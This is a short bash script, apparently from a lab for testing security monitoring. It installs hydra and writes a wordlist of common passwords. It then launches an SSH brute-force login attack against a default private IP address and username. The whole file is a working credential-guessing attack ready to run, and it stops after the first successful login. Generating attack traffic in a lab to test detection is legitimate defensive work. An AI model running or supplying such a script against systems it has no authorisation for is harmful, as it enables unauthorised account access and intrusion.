#!/bin/bash
TARGET_IP="${1:-192.168.8.130}"
TARGET_USER="${2:-linux-endpoint-1}"

if ! command -v hydra &> /dev/null; then
    sudo apt update -qq && sudo apt install -y hydra -qq
fi

WORDLIST="/tmp/brute_wordlist.txt"
cat > "$WORDLIST" << 'PASSWORDS'
password123
admin
123456
root
ubuntu
siem-vm
password
12345
qwerty
letmein
welcome
monkey
dragon
master
shadow
sunshine
princess
football
baseball
iloveyou
trustno1
abc123
password1
admin123
PASSWORDS

hydra -l "$TARGET_USER" -P "$WORDLIST" -t 6 -f -V ssh://$TARGET_IP